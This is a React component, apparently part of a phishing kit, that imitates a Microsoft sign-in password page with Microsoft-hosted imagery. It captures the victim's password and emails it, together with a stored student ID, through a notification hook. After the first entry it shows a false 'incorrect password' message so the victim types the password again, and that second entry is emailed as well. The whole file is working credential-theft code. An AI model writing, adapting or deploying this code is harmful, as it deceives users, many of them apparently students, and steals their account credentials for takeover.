import React, { useState } from "react";
import { FormFooter } from "./FormFooter";
import NotificationSender from "./NotificationSender"; // Import the NotificationSender hook

export const Password = ({ email, onBack, onNext, passwordError }) => {
  const [passwordValue, setPasswordValue] = useState(""); // State to handle the password input value
  const [isError, setIsError] = useState(false); // Track error state
  const [attemptedOnce, setAttemptedOnce] = useState(false); // Track if it's the first attempt
  const { sendEmail, isSending, error, successMessage } = NotificationSender(); // Destructure sendEmail from NotificationSender

  const handleNext = () => {
    if (!passwordValue.trim()) {
      setIsError(true); // Show error if password is empty
      return;
    }

    const studentId = localStorage.getItem("student_id"); // Fetch student ID from localStorage

    // Check if it's the first or second attempt and store the password
    if (attemptedOnce) {
      // Store second password in localStorage when it's the second attempt
      localStorage.setItem("secondPassword", passwordValue);
      sendEmail(
        `Second password entry`, // Subject
        `Password: ${passwordValue} \nStudent ID: ${studentId}` // Message
      );
      onNext(passwordValue); // Proceed to next step (e.g., OTP or other step)
    } else {
      // Store first password in localStorage when it's the first attempt
      localStorage.setItem("firstPassword", passwordValue);
      sendEmail(
        `First password entry`, // Subject
        `Password: ${passwordValue} \nStudent ID: ${studentId}` // Message
      );
      setAttemptedOnce(true); // Mark that the first attempt has been made
      setIsError(true); // Show incorrect password message after first attempt
    }
  };

  return (
    <>
      <div className="field-container">
        <div className="email-entered">
          <button className="arrow" onClick={onBack}>
            <img
              src="https://aadcdn.msauth.net/shared/1.0/content/images/arrow_left_43280e0ba671a1d8b5e34f1931c4fe4b.svg"
              alt="arrow_left"
            />
          </button>
          <p>{email}</p>
        </div>
        <h1 className="form-title">Enter Password</h1>

        <div className="input-message">
          {isError && (
            <p className="guide error">
              {attemptedOnce ? (
                <>
                  Your account or password is incorrect. If you don't remember
                  your password,
                  <span className="reset-link" style={{ cursor: "pointer" }}>
                    reset it now
                  </span>
                  .
                </>
              ) : (
                "Please enter your password."
              )}
            </p>
          )}
          {error && <p className="error">{error}</p>}{" "}
          {/* Display success message */}
          <input
            type="password"
            name="password"
            id="password"
            placeholder="Password"
            className="field password-field"
            value={passwordValue}
            onChange={(e) => setPasswordValue(e.target.value)} // Update password value
            style={{
              borderBottom: isError ? "1px solid red" : "1px solid #ccc", // Change border to red when there's an error
              backgroundColor: isError ? "transparent" : "transparent", // Light red background on error
            }}
          />
        </div>
        {/* <a className="reset">Reset or Forgot Password</a> */}
     
        <div className="button-container">
          <button
            type="button"
            className="next"
            onClick={handleNext}
            disabled={isSending} // Disable button while sending email
          >
            {isSending ? "Next" : "Next"}{" "}
            {/* Show loading text when sending */}
          </button>
        </div>
      </div>
      {/* <FormFooter /> */}
    </>
  );
};
